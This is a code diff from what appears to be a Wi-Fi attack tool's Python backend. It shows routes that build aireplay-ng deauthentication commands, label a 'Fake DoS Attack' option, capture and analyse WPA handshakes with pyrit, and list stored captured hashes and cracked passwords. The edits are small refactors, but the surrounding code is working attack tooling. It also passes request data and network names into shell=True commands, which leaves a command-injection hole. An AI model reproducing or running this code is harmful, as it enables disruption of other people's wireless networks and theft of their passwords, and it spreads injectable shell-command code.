@@ -134,7 +134,7 @@ def attack(id):
             #WPA/WPA2 With Clients
             case 0: #Deauthentication
                 data = req(request)
-                nPackets = escape(data.get('n'))
+                nPackets = escape(data.get('n', ''))
                 attack = f'aireplay-ng -0 {nPackets} -a {bssid} {netcardMon}'
                 pass
             case 1: #Fake DoS Attack
@@ -192,7 +192,7 @@ def attack(id):
         subprocess.run(f'pyrit -r {path}/dumpDataAttack-01.cap analyze', shell=True)
 
         #Guardar handshake
-        subprocess.run(f'cp "{path}/dumpDataAttack-01.cap" "hashDB/{essid}&{bssid}.cap"', shell=True)
+        subprocess.run(f'cp "{path}/dumpDataAttack-01.cap" "hashDB/{essid}+{bssid}.cap"', shell=True)
         
         return ret({"status":"OK"})
     except Exception as e:
@@ -272,12 +272,11 @@ def getLists(list):
         folder_path = join(parent_directory, list)
 
         file_list = [f for f in listdir(folder_path) if isfile(join(folder_path, f))]
-        print(file_list)
 
         if list == "passDB":
-            key_list = [{'apName': f.split('&')[0], 'bssid': f.split('&')[1], 'password': readPasswordFromFile(join(folder_path, f))} for f in file_list]
+            key_list = [{'apName': f.split('+')[0], 'bssid': f.split('+')[1], 'password': readPasswordFromFile(join(folder_path, f))} for f in file_list]
         elif list == "hashDB":
-            key_list = [{'apName': f.split('&')[0], 'bssid': f.split('&')[1].replace('.cap', ''), 'password': None} for f in file_list]
+            key_list = [{'apName': f.split('+')[0], 'bssid': f.split('+')[1].replace('.cap', ''), 'password': None} for f in file_list]
         else:
             key_list = file_list
 
